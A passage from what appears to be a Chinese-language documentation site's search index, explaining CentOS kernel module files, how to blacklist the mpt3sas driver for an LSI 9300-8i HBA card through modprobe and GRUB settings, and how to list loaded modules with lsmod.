\u5305\u542b\u6a21\u5757\u522b\u540d\u7684\u6620\u5c04\uff0c\u6709\u52a9\u4e8e modprobe \u547d\u4ee4\u8bc6\u522b\u8bf7\u6c42\u52a0\u8f7d\u54ea\u4e2a\u6a21\u5757\u3002 modules.alias.bin : \u662f modules.alias \u7684\u4e8c\u8fdb\u5236\u7248\u672c\uff0c\u52a0\u5feb\u5904\u7406\u901f\u5ea6\u3002 modules.block : \u53ef\u80fd\u5305\u542b\u4e0e\u5757\u8bbe\u5907\uff08\u5982\u786c\u76d8\u9a71\u52a8\uff09\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.dep : \u5305\u542b\u6a21\u5757\u95f4\u4f9d\u8d56\u5173\u7cfb\u7684\u4fe1\u606f\u3002 modules.dep.bin : \u662f modules.dep \u7684\u4e8c\u8fdb\u5236\u7248\u672c\u3002 modules.devname : \u5305\u542b\u6a21\u5757\u548c\u8bbe\u5907\u540d\u79f0\u4e4b\u95f4\u7684\u6620\u5c04\u3002 modules.drm : \u4e0e\u76f4\u63a5\u6e32\u67d3\u7ba1\u7406\u5668\uff08DRM\uff09\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.modesetting : \u4e0e\u56fe\u5f62\u6a21\u5f0f\u8bbe\u7f6e\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.networking : \u4e0e\u7f51\u7edc\u529f\u80fd\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.order : \u5217\u51fa\u4e86\u6a21\u5757\u7684\u52a0\u8f7d\u987a\u5e8f\u3002 modules.softdep : \u63cf\u8ff0\u4e86\u6a21\u5757\u95f4\u8f6f\u4f9d\u8d56\u5173\u7cfb\u3002 modules.symbols : \u5305\u542b\u6a21\u5757\u5bfc\u51fa\u7b26\u53f7\u7684\u4fe1\u606f\u3002 modules.symbols.bin : \u662f modules.symbols \u7684\u4e8c\u8fdb\u5236\u7248\u672c\u3002 source : \u901a\u5e38\u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u6307\u5411\u5185\u6838\u6e90\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002 updates : \u7528\u4e8e\u5b58\u653e\u5185\u6838\u6a21\u5757\u7684\u66f4\u65b0\u6216\u4fee\u8865\u7a0b\u5e8f\u3002 vdso : \u4e0e\u865a\u62df\u52a8\u6001\u5171\u4eab\u5bf9\u8c61\uff08vDSO\uff09\u76f8\u5173\u7684\u4fe1\u606f\u3002 weak-updates : \u7528\u4e8e\u5b58\u653e\u5f31\u66f4\u65b0\u6a21\u5757\uff0c\u8fd9\u4e9b\u6a21\u5757\u53ef\u80fd\u4f1a\u8986\u76d6\u539f\u59cb\u6a21\u5757\u3002 modules.builtin : \u5217\u51fa\u4e86\u5185\u6838\u5185\u7f6e\u7684\u6a21\u5757\u3002 modules.builtin.bin : \u662f modules.builtin \u7684\u4e8c\u8fdb\u5236\u7248\u672c\u3002 \u67d0\u6848\u4f8b\uff1a \u67d0\u673a\u5668\u4f7f\u7528LSI HBA\u76f4\u901a\u5361\uff0cHBA LSI 9300-8i\u5361\uff0c\u63d2\u4e0a\u540e\uff0c\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\uff0c\u67d0\u5927\u795e\u901a\u8fc7/etc/modprobe.d/blacklist.conf\u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e blacklist mpt3sas \u7981\u7528\u4e86\u8be5\u5361\u7684\u9a71\u52a8\uff0c\u7cfb\u7edf\u6210\u529f\u542f\u52a8\u3002\u56e0\u4e3a\u5ba2\u6237\u4e0d\u4f7f\u7528\u8be5\u5361\uff0c\u4f46\u662f\u5e0c\u671b\u5728\u5e26\u5916\u4e0a\u770b\u5230\u3002 \u8bfe\u5916\u77e5\u8bc6\uff1a HBA LSI 9300-8i \u662f\u4e00\u6b3e\u7531LSI\u516c\u53f8\uff08\u73b0\u4e3aBroadcom\u7684\u4e00\u90e8\u5206\uff09\u751f\u4ea7\u7684Host Bus Adapter\uff08\u4e3b\u673a\u603b\u7ebf\u9002\u914d\u5668\uff09\u5361\u3002\u8fd9\u6b3e\u9002\u914d\u5668\u5361\u901a\u5e38\u7528\u4e8e\u8fde\u63a5\u670d\u52a1\u5668\u4e0e\u5916\u90e8\u5b58\u50a8\u7cfb\u7edf\uff0c\u5982\u786c\u76d8\u9635\u5217\u6216\u78c1\u5e26\u5e93\u3002\u5b83\u652f\u6301SAS\uff08Serial Attached SCSI\uff09\u548cSATA\uff08Serial ATA\uff09\u63a5\u53e3\uff0c\u4f7f\u5176\u80fd\u591f\u517c\u5bb9\u591a\u79cd\u5b58\u50a8\u8bbe\u5907\u3002 LSI 9300-8i \u7684\u4e3b\u8981\u7279\u70b9\u5305\u62ec\uff1a 1.\u7aef\u53e3\u6570\u91cf\u548c\u901f\u5ea6\uff1a\u6b64\u5361\u63d0\u4f9b8\u4e2aSAS/SATA\u7aef\u53e3\uff0c\u6bcf\u4e2a\u7aef\u53e3\u7684\u6570\u636e\u4f20\u8f93\u901f\u5ea6\u9ad8\u8fbe12Gb/s\uff0c\u9002\u7528\u4e8e\u9ad8\u6027\u80fd\u5b58\u50a8\u9700\u6c42\u3002 2.\u76f4\u901a\u8bbe\u8ba1\uff1a\u4f5c\u4e3a\u4e00\u6b3eHBA\u5361\uff0c9300-8i \u901a\u5e38\u4ee5\u76f4\u901a\u6a21\u5f0f\uff08pass-through mode\uff09\u5de5\u4f5c\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u5c06\u5b58\u50a8\u8bbe\u5907\u76f4\u63a5\u5448\u73b0\u7ed9\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c\u4e0d\u8fdb\u884cRAID\u6216\u5176\u4ed6\u989d\u5916\u5904\u7406\u3002 3.\u5e7f\u6cdb\u517c\u5bb9\u6027\uff1a\u652f\u6301\u591a\u79cd\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u5e73\u53f0\uff0c\u9002\u7528\u4e8e\u5404\u79cd\u4f01\u4e1a\u7ea7\u548c\u6570\u636e\u4e2d\u5fc3\u5e94\u7528\u573a\u666f\u3002 4.\u9ad8\u53ef\u9760\u6027\u548c\u6027\u80fd\uff1a\u63d0\u4f9b\u7a33\u5b9a\u548c\u9ad8\u901f\u7684\u6570\u636e\u4f20\u8f93\u80fd\u529b\uff0c\u975e\u5e38\u9002\u5408\u8981\u6c42\u9ad8\u53ef\u9760\u6027\u548c\u6027\u80fd\u7684\u5e94\u7528\u3002 LSI 9300-8i \u9002\u914d\u5668\u5361\u56e0\u5176\u4f18\u79c0\u7684\u6027\u80fd\u548c\u53ef\u9760\u6027\uff0c\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u9700\u8981\u5927\u91cf\u6570\u636e\u5b58\u50a8\u548c\u5feb\u901f\u6570\u636e\u8bbf\u95ee\u7684\u73af\u5883\u4e2d\u3002 \u7ecf\u8fc7\u67e5\u8be2\uff0c\u8fd9\u6b3e\u76f4\u901a\u5361\u5728Linux\u7684\u9a71\u52a8\u53ebmpt3sas\uff0cmpt3sas \u662f\u4e00\u4e2a\u7528\u4e8eLinux\u7cfb\u7edf\u7684\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4e3b\u8981\u7528\u6765\u652f\u6301LSI\uff08\u73b0\u5728\u662fBroadcom\u7684\u4e00\u90e8\u5206\uff09\u751f\u4ea7\u7684SAS 3.0\uff08Serial Attached SCSI \u7b2c\u4e09\u4ee3\uff09\u63a7\u5236\u5668\u3002\u8fd9\u4e9b\u63a7\u5236\u5668\u5305\u62ec\u4f46\u4e0d\u9650\u4e8eLSI SAS 9300\u7cfb\u5217\u5361\uff0c\u4f8b\u5982\u524d\u6587\u63d0\u5230\u7684LSI 9300-8i HBA\u5361\u3002 \u8fd9\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u4f7f\u5f97Linux\u64cd\u4f5c\u7cfb\u7edf\u80fd\u591f\u8bc6\u522b\u548c\u6709\u6548\u5730\u4e0e\u5b89\u88c5\u6709LSI SAS\u63a7\u5236\u5668\u7684\u786c\u4ef6\u901a\u4fe1\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u8fde\u63a5\u5230\u8fd9\u4e9b\u63a7\u5236\u5668\u7684\u5b58\u50a8\u8bbe\u5907\uff08\u5982\u786c\u76d8\u3001\u56fa\u6001\u786c\u76d8\u6216\u78c1\u5e26\u9a71\u52a8\u5668\uff09\u7684\u7ba1\u7406\u548c\u8bbf\u95ee\u3002 \u7b80\u800c\u8a00\u4e4b\uff0cmpt3sas \u662f Linux \u7cfb\u7edf\u4e0b\u7528\u6765\u786e\u4fdd\u670d\u52a1\u5668\u6216\u8ba1\u7b97\u673a\u53ef\u4ee5\u6b63\u786e\u8bc6\u522b\u5e76\u4f7f\u7528\u57fa\u4e8e LSI SAS 3.0 \u6280\u672f\u7684\u5b58\u50a8\u63a7\u5236\u5668\u7684\u5173\u952e\u8f6f\u4ef6\u7ec4\u4ef6\u3002 \u4e0d\u662f\u6240\u6709LSI\u7684\u9a71\u52a8\u90fd\u53ebmpt3sas\u3002mpt3sas \u662f\u7528\u4e8e\u7279\u5b9aLSI SAS\u63a7\u5236\u5668\u7684Linux\u9a71\u52a8\u7a0b\u5e8f\uff0c\u5c24\u5176\u662f\u652f\u6301SAS 3.0\uff0812Gb/s\uff09\u89c4\u683c\u7684\u63a7\u5236\u5668\u3002\u7136\u800c\uff0cLSI\u751f\u4ea7\u4e86\u591a\u79cd\u4e0d\u540c\u7c7b\u578b\u548c\u4ee3\u7684SAS\u63a7\u5236\u5668\uff0c\u8fd9\u4e9b\u63a7\u5236\u5668\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u4f8b\u5982\uff0c\u9488\u5bf9\u8f83\u65e9\u4ee3\u7684SAS\u63a7\u5236\u5668\uff08\u5982SAS 2.0\uff09\uff0c\u53ef\u80fd\u4f7f\u7528\u7684\u662fmpt2sas\u9a71\u52a8\u3002\u8fd8\u6709\u9488\u5bf9\u7279\u5b9a\u578b\u53f7\u548c\u529f\u80fd\uff08\u6bd4\u5982RAID\u529f\u80fd\uff09\u7684\u63a7\u5236\u5668\uff0c\u53ef\u80fd\u4f1a\u6709\u4e13\u7528\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u56e0\u6b64\uff0c\u9009\u62e9\u9a71\u52a8\u7a0b\u5e8f\u65f6\u9700\u8981\u57fa\u4e8e\u5177\u4f53\u7684\u786c\u4ef6\u578b\u53f7\u548c\u64cd\u4f5c\u7cfb\u7edf\u6765\u786e\u5b9a\u9002\u5408\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002\u901a\u5e38\uff0c\u53ef\u4ee5\u5728\u786c\u4ef6\u5236\u9020\u5546\u7684\u5b98\u65b9\u7f51\u7ad9\u6216\u4e0e\u60a8\u7684\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\u7684\u8f6f\u4ef6\u5e93\u4e2d\u627e\u5230\u6b63\u786e\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u5728Linux\u7cfb\u7edf\u4e2d\uff0c\u7981\u7528\u7279\u5b9a\u7684\u5185\u6838\u6a21\u5757\uff08\u5982mpt3sas\u9a71\u52a8\uff09\u53ef\u4ee5\u901a\u8fc7\u51e0\u79cd\u65b9\u5f0f\u5b9e\u73b0\u3002\u4e0b\u9762\u662f\u51e0\u79cd\u5e38\u89c1\u7684\u65b9\u6cd5\uff1a 1.\u4e34\u65f6\u7981\u7528\uff08\u5355\u6b21\u542f\u52a8\uff09 : \u5728Linux\u542f\u52a8\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u5185\u6838\u542f\u52a8\u53c2\u6570\u6765\u4e34\u65f6\u7981\u7528\u6a21\u5757\u3002\u5728\u542f\u52a8\u52a0\u8f7d\u5668\uff08\u5982GRUB\uff09\u7684\u542f\u52a8\u83dc\u5355\u4e2d\uff0c\u9009\u62e9\u8981\u542f\u52a8\u7684Linux\u5185\u6838\uff0c\u7136\u540e\u7f16\u8f91\u542f\u52a8\u53c2\u6570\uff0c\u6dfb\u52a0 modprobe.blacklist=mpt3sas \u3002\u8fd9\u6837\uff0c\u5728\u8fd9\u6b21\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0cmpt3sas\u6a21\u5757\u5c06\u4e0d\u4f1a\u88ab\u52a0\u8f7d\u3002 2.\u6c38\u4e45\u7981\u7528 : \u8981\u6c38\u4e45\u7981\u7528mpt3sas\u6a21\u5757\uff0c\u53ef\u4ee5\u5728 /etc/modprobe.d/ \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff08\u5982 blacklist.conf \uff09\uff0c\u5e76\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a blacklist mpt3sas \u4fdd\u5b58\u6587\u4ef6\u540e\uff0c\u8fd9\u4e2a\u6a21\u5757\u5728\u672a\u6765\u7684\u542f\u52a8\u4e2d\u5c06\u4e0d\u4f1a\u88ab\u81ea\u52a8\u52a0\u8f7d\u3002 3.\u901a\u8fc7\u5185\u6838\u53c2\u6570\u6c38\u4e45\u7981\u7528 : \u5bf9\u4e8e\u57fa\u4e8eRed Hat\u7684\u7cfb\u7edf\uff0c\u5982CentOS\uff0c\u6b65\u9aa4\u7c7b\u4f3c\uff0c\u4f46\u6709\u4e00\u4e9b\u7ec6\u5fae\u5dee\u522b\u3002\u4ee5\u4e0b\u662f\u5728CentOS\u7cfb\u7edf\u4e0a\u901a\u8fc7\u5185\u6838\u53c2\u6570\u6c38\u4e45\u7981\u7528\u9a71\u52a8\u7684\u6b65\u9aa4\uff1a \u7f16\u8f91GRUB\u914d\u7f6e\u6587\u4ef6\u3002\u8fd9\u901a\u5e38\u662f /etc/default/grub \u3002\u4f60\u53ef\u4ee5\u4f7f\u7528\u6587\u672c\u7f16\u8f91\u5668\u6253\u5f00\u5b83\uff0c\u4f8b\u5982\u4f7f\u7528\u547d\u4ee4\uff1a sudo vi /etc/default/grub \u627e\u5230 GRUB_CMDLINE_LINUX \u8fd9\u4e00\u884c\u3002\u5b83\u770b\u8d77\u6765\u53ef\u80fd\u50cf\u8fd9\u6837\uff1a GRUB_CMDLINE_LINUX=\"crashkernel=auto rhgb quiet\" \u6dfb\u52a0 modprobe.blacklist=mpt3sas \u5230\u8be5\u884c\u7684\u672b\u5c3e\uff0c\u4fdd\u6301\u5176\u4ed6\u53c2\u6570\u4e0d\u53d8\u3002\u4fee\u6539\u540e\u7684\u884c\u53ef\u80fd\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a GRUB_CMDLINE_LINUX=\"crashkernel=auto rhgb quiet modprobe.blacklist=mpt3sas\" \u4fdd\u5b58\u5e76\u5173\u95ed\u6587\u4ef6\u3002 \u7531\u4e8e\u60a8\u66f4\u6539\u4e86GRUB\u914d\u7f6e\uff0c\u9700\u8981\u91cd\u65b0\u751f\u6210GRUB\u914d\u7f6e\u6587\u4ef6\u3002\u5728CentOS\u4e0a\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a sudo grub2-mkconfig -o /boot/grub2/grub.cfg \u5bf9\u4e8e\u4f7f\u7528UEFI\u542f\u52a8\u7684\u7cfb\u7edf\uff0c\u8def\u5f84\u53ef\u80fd\u4e0d\u540c\uff0c\u53ef\u80fd\u9700\u8981\u4f7f\u7528\uff1a sudo grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg grub2-mkconfig \u662f\u4e00\u4e2a\u7528\u4e8e\u751f\u6210GRUB2\uff08GRand Unified Bootloader version 2\uff09\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u5de5\u5177\u3002GRUB\u662fLinux\u548c\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u7528\u6765\u7ba1\u7406\u5f15\u5bfc\u8fc7\u7a0b\u7684\u4e00\u79cd\u5f15\u5bfc\u52a0\u8f7d\u5668\u3002 \u5728\u5927\u591a\u6570\u57fa\u4e8eLinux\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c grub-mkconfig \u547d\u4ee4\u4f1a\u751f\u6210\u4e00\u4e2a\u540d\u4e3a grub.cfg \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u901a\u5e38\u4f4d\u4e8e /boot/grub/ \u6216 /boot/grub2/ \u76ee\u5f55\u4e0b\u3002\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u5305\u542b\u4e86\u542f\u52a8\u83dc\u5355\u9009\u9879\u3001\u5185\u6838\u53c2\u6570\u3001\u5f15\u5bfc\u7684\u64cd\u4f5c\u7cfb\u7edf\u5217\u8868\u7b49\u4fe1\u606f\u3002 \u5f53\u60a8\u5b89\u88c5\u65b0\u7684\u5185\u6838\u6216\u8005\u66f4\u6539\u5f15\u5bfc\u76f8\u5173\u7684\u8bbe\u7f6e\u65f6\uff0c\u901a\u5e38\u9700\u8981\u91cd\u65b0\u751f\u6210\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u4ee5\u786e\u4fdd\u5f15\u5bfc\u52a0\u8f7d\u5668\u80fd\u591f\u8bc6\u522b\u548c\u52a0\u8f7d\u65b0\u7684\u66f4\u6539\u3002 grub2-mkconfig \u547d\u4ee4\u901a\u5e38\u4f1a\u81ea\u52a8\u68c0\u6d4b\u7cfb\u7edf\u4e2d\u5b89\u88c5\u7684\u6240\u6709\u5185\u6838\u548c\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u521b\u5efa\u76f8\u5e94\u7684\u5f15\u5bfc\u83dc\u5355\u9879\u3002 \u4e3b\u8981\u529f\u80fd \u200b \u68c0\u6d4b\u64cd\u4f5c\u7cfb\u7edf\u548c\u5185\u6838 \uff1a\u81ea\u52a8\u641c\u7d22\u5e76\u6dfb\u52a0\u7cfb\u7edf\u4e2d\u6240\u6709\u53ef\u7528\u7684Linux\u5185\u6838\u4ee5\u53ca\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\uff08\u5982Windows\uff09\u7684\u5f15\u5bfc\u9879\u3002 \u200b \u751f\u6210\u5f15\u5bfc\u83dc\u5355 \uff1a\u6839\u636e\u68c0\u6d4b\u5230\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u5185\u6838\uff0c\u4ee5\u53ca /etc/default/grub \u548c /etc/grub.d/ \u4e2d\u7684\u914d\u7f6e\u548c\u811a\u672c\uff0c\u751f\u6210\u4e00\u4e2a\u8be6\u7ec6\u7684\u5f15\u5bfc\u83dc\u5355\u3002 \u200b \u652f\u6301\u81ea\u5b9a\u4e49 \uff1a\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91 /etc/default/grub \u6587\u4ef6\u6216\u5728 /etc/grub.d/ \u76ee\u5f55\u4e0b\u6dfb\u52a0\u81ea\u5b9a\u4e49\u811a\u672c\uff0c\u6765\u5f71\u54cd\u751f\u6210\u7684\u914d\u7f6e\u6587\u4ef6\u3002 \u4f7f\u7528 grub2-mkconfig \u65f6\uff0c\u901a\u5e38\u9700\u8981\u4ee5\u8d85\u7ea7\u7528\u6237\u6743\u9650\u8fd0\u884c \u5728\u57fa\u4e8eRed Hat\u7684\u7cfb\u7edf\uff08\u5982CentOS\u6216Fedora\uff09\u4e2d\uff0c\u547d\u4ee4\uff1a sudo grub2-mkconfig -o /boot/grub2/grub.cfg \u8bf7\u6ce8\u610f\uff0c\u76f4\u63a5\u7f16\u8f91 grub.cfg \u6587\u4ef6\u901a\u5e38\u4e0d\u63a8\u8350\uff0c\u56e0\u4e3a\u8be5\u6587\u4ef6\u5728\u8fd0\u884c grub2-mkconfig \u6216\u7cfb\u7edf\u66f4\u65b0\u65f6\u4f1a\u88ab\u8986\u76d6\u3002\u76f8\u53cd\uff0c\u5efa\u8bae\u7f16\u8f91 /etc/default/grub \u6587\u4ef6\u6216\u5728 /etc/grub.d/ \u76ee\u5f55\u4e2d\u6dfb\u52a0\u81ea\u5b9a\u4e49\u811a\u672c\uff0c\u7136\u540e\u4f7f\u7528 grub-mkconfig \u91cd\u65b0\u751f\u6210\u914d\u7f6e\u3002 \u91cd\u65b0\u542f\u52a8\u7cfb\u7edf\u4ee5\u5e94\u7528\u66f4\u6539\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u7981\u7528\u67d0\u4e9b\u9a71\u52a8\u53ef\u80fd\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u56e0\u6b64\u8bf7\u786e\u4fdd\u60a8\u4e86\u89e3\u8fd9\u6837\u505a\u7684\u540e\u679c\u3002\u5982\u679c\u60a8\u7684\u7cfb\u7edf\u4f9d\u8d56\u4e8empt3sas\u9a71\u52a8\u6765\u8bbf\u95ee\u5b58\u50a8\u8bbe\u5907\uff0c\u7981\u7528\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u95ee\u9898\u3002\u5728\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u60a8\u5df2\u5907\u4efd\u91cd\u8981\u6570\u636e\u548c\u7cfb\u7edf\u914d\u7f6e\u3002 \u5728\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u60a8\u4e86\u89e3\u7981\u7528\u7279\u5b9a\u9a71\u52a8\u7684\u5f71\u54cd\uff0c\u7279\u522b\u662f\u5982\u679c\u60a8\u7684\u7cfb\u7edf\u4f9d\u8d56\u4e8e\u8be5\u9a71\u52a8\u6765\u8bbf\u95ee\u91cd\u8981\u7684\u786c\u4ef6\u8bbe\u5907\u65f6\u3002\u7981\u7528\u5173\u952e\u7684\u9a71\u52a8\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u6216\u67d0\u4e9b\u529f\u80fd\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\u3002 \u5728CentOS\u7cfb\u7edf\u4e2d\uff0c /boot/grub2 \u548c /boot/grub \u8fd9\u4e24\u4e2a\u76ee\u5f55\u7684\u533a\u522b\u4e3b\u8981\u662f\u7531\u4e8eGRUB\u7248\u672c\u7684\u4e0d\u540c\uff1a 1.GRUB2 \uff08\u8f83\u65b0\u7248\u672c\uff09\uff1aCentOS 7\u53ca\u66f4\u9ad8\u7248\u672c\u9ed8\u8ba4\u4f7f\u7528GRUB2\u4f5c\u4e3a\u5f15\u5bfc\u52a0\u8f7d\u5668\u3002\u5728\u8fd9\u4e9b\u7cfb\u7edf\u4e2d\uff0cGRUB2\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u76f8\u5173\u7684\u5f15\u5bfc\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e /boot/grub2 \u76ee\u5f55\u3002 2.GRUB Legacy \uff08\u8f83\u65e7\u7248\u672c\uff09\uff1a\u5728\u8f83\u65e7\u7684CentOS\u7248\u672c\u4e2d\uff08\u5982CentOS 6\u53ca\u4e4b\u524d\uff09\uff0c\u9ed8\u8ba4\u4f7f\u7528\u7684\u662fGRUB Legacy\u3002\u5728\u8fd9\u4e9b\u7cfb\u7edf\u4e2d\uff0cGRUB Legacy\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u76f8\u5173\u5f15\u5bfc\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e /boot/grub \u76ee\u5f55\u3002 \u4e3b\u8981\u533a\u522b\uff1a 1.\u914d\u7f6e\u6587\u4ef6\u4f4d\u7f6e \uff1a \u5728\u4f7f\u7528GRUB2\u7684CentOS\u7cfb\u7edf\u4e2d\uff0c\u4e3b\u8981\u7684\u914d\u7f6e\u6587\u4ef6\u662f /boot/grub2/grub.cfg \u3002 \u5728\u4f7f\u7528GRUB Legacy\u7684\u8f83\u65e7CentOS\u7cfb\u7edf\u4e2d\uff0c\u4e3b\u8981\u7684\u914d\u7f6e\u6587\u4ef6\u53ef\u80fd\u662f /boot/grub/menu.lst \u6216 /boot/grub/grub.conf \u3002 2.\u529f\u80fd\u548c\u8bbe\u8ba1 \uff1a GRUB2\u76f8\u6bd4\u4e8eGRUB Legacy\u62e5\u6709\u66f4\u591a\u7684\u529f\u80fd\uff0c\u66f4\u597d\u7684\u6a21\u5757\u5316\u8bbe\u8ba1\uff0c\u4ee5\u53ca\u66f4\u6613\u4e8e\u7406\u89e3\u548c\u7ef4\u62a4\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 \u5728\u5b9e\u9645\u64cd\u4f5c\u4e2d\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662fCentOS 7\u6216\u66f4\u9ad8\u7248\u672c\uff0c\u4f60\u51e0\u4e4e\u603b\u662f\u4f1a\u4e0e /boot/grub2 \u76ee\u5f55\u6253\u4ea4\u9053\u3002\u800c\u5bf9\u4e8e\u65e7\u7248CentOS\uff0c\u6bd4\u5982CentOS 6\u53ca\u66f4\u65e9\u7248\u672c\uff0c\u624d\u4f1a\u6d89\u53ca\u5230 /boot/grub \u76ee\u5f55\u3002","title":"CentOS\u67e5\u770b\u7cfb\u7edf\u9a71\u52a8"},{"location":"system/centos7/CentOS%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E9%A9%B1%E5%8A%A8/#centos","text":"\u8981\u67e5\u770bLinux\u7cfb\u7edf\u4e2d\u9884\u88c5\u7684\u9a71\u52a8\u7a0b\u5e8f\u5217\u8868\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u51e0\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u6709\u4e24\u79cd\u5e38\u7528\u65b9\u6cd5\uff1a","title":"CentOS\u67e5\u770b\u7cfb\u7edf\u9a71\u52a8"},{"location":"system/centos7/CentOS%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E9%A9%B1%E5%8A%A8/#1","text":"\u4f7f\u7528 lsmod \u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u5f53\u524d\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757\uff08\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002\u8fd9\u4f1a\u663e\u793a\u5f53\u524d\u4f1a\u8bdd\u4e2d\u5b9e\u9645\u4f7f\u7528\u7684\u6a21\u5757\u3002\u6253\u5f00\u7ec8\u7aef\uff0c\u7136\u540e\u8f93\u5165\uff1a lsmod \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5217\u51fa\u6240\u6709\u5f53\u524d\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757\u4ee5\u53ca\u5b83\u4eec\u7684\u4f9d\u8d56\u5173\u7cfb\u548c\u4f7f\u7528\u72b6\u6001\u3002 \u4f8b\u5982\uff1a [root@VM-0-16-centos ~]# lsmod | nl 1 Module Size Used by 2 binfmt_misc 17468 1 3 tcp_diag 12591 0 4 inet_diag 18949 1 tcp_diag 5 iptable_filter 12810 0 6 nls_utf8 12557 0 7 isofs 43940 0 8 iosf_mbi 15582 0 9 crc32_pclmul 13133 0 10 ghash_clmulni_intel 13273 0 11 ppdev 17671 0 12 aesni_intel 189456 0 13 lrw 13286 1 aesni_intel 14 gf128mul 15139 1 lrw 15 glue_helper 13990 1 aesni_intel 16 ablk_helper 13597 1 aesni_intel 17 cryptd 21190 3 ghash_clmulni_intel,aesni_intel,ablk_helper 18 joydev 17389 0 19 sg 40719 0 20 virtio_balloon 18015 0 21 pcspkr 12718 0 22 parport_pc 28205 0 23 i2c_piix4 22401 0 24 parport 46395 2 ppdev,parport_pc 25 ip_tables 27126 1 iptable_filter 26 ext4 592325 1 27 mbcache 14958 1 ext4 28 jbd2 107486 1 ext4 29 sr_mod 22416 0 30 cdrom 46696 1 sr_mod 31 ata_generic 12923 0 32 pata_acpi 13053 0 33 virtio_net 27994 0 34 net_failover 18147 1 virtio_net 35 virtio_blk 18472 2 36 failover 13374 1 net_failover 37 cirrus 24171 1 38 drm_kms_helper 186531 1 cirrus 39 syscopyarea 12529 1 drm_kms_helper 40 sysfillrect 12701 1 drm_kms_helper 41 sysimgblt 12640 1 drm_kms_helper 42 fb_sys_fops 12703 1 drm_kms_helper 43 ttm 100769 1 cirrus 44 crct10dif_pclmul 14307 0 45 crct10dif_common 12595 1 crct10dif_pclmul 46 crc32c_intel 22094 0 47 ata_piix 35052 0 48 drm 468454 4 ttm,drm_kms_helper,cirrus 49 serio_raw 13434 0 50 libata 247190 3 pata_acpi,ata_generic,ata_piix 51 virtio_pci 22985 0 52 virtio_ring 22991 4 virtio_blk,virtio_net,virtio_pci,virtio_balloon 53 virtio 14959 4 virtio_blk,virtio_net,virtio_pci,virtio_balloon 54 drm_panel_orientation_quirks 17180 1 drm 55 floppy 73520 0 \u8fd9\u4e2a\u547d\u4ee4 lsmod 